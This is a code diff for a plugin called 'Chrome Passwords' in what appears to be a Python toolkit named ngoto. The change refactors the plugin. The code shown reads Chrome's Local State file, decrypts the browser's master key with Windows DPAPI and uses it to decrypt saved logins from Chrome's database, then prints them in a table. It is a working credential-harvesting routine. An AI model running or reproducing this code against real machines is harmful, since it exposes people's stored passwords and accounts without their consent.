@@ -2,6 +2,28 @@ from ngoto import PluginBase, Logging, output, Table, Style
 from dataclasses import dataclass
 
 
+def get_encryption_key():
+    import os
+    import json
+    import base64
+    import win32crypt
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    # decode the encryption key from Base64
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    # remove DPAPI str
+    key = key[5:]
+    # return decrypted key that was originally encrypted
+    # using a session key derived from current user's logon credentials
+    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
 class Plugin(PluginBase):
     name = 'Chrome Passwords'
     version = 0.1
@@ -16,34 +38,6 @@ class Plugin(PluginBase):
     title_style = Style(color="blue", blink=False, bold=True)
     border_style = Style(color="black", blink=False, bold=True)
     header_style = Style(color="black", blink=False, bold=True)
-
-    def get_chrome_datetime(self, chromedate):
-        """Return a `datetime.datetime` object from a chrome format datetime
-        Since `chromedate` is formatted as the number of microseconds since
-        January, 1601"""
-        from datetime import datetime, timedelta
-        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
-    def get_encryption_key(self):
-        import os
-        import json
-        import base64
-        import win32crypt
-        local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                        "AppData", "Local", "Google", "Chrome",
-                                        "User Data", "Local State")
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-
-        # decode the encryption key from Base64
-        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        # remove DPAPI str
-        key = key[5:]
-        # return decrypted key that was originally encrypted
-        # using a session key derived from current user's logon credentials
-        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
     def decrypt_password(self, password, key):
         from Crypto.Cipher import AES
@@ -74,7 +68,7 @@ class Plugin(PluginBase):
         import os
         import sqlite3
         # get the AES key
-        key = self.get_encryption_key()
+        key = get_encryption_key()
         # local sqlite Chrome database path
         db_path = os.path.join(
             os.environ["USERPROFILE"], "AppData", "Local",
@@ -160,7 +154,3 @@ class Plugin(PluginBase):
                 password.date_created,
                 password.date_last_used)
         output(self.table)
-
-    # holds sqlite3 create table query to store information
-    def create_table(self):
-        return ''
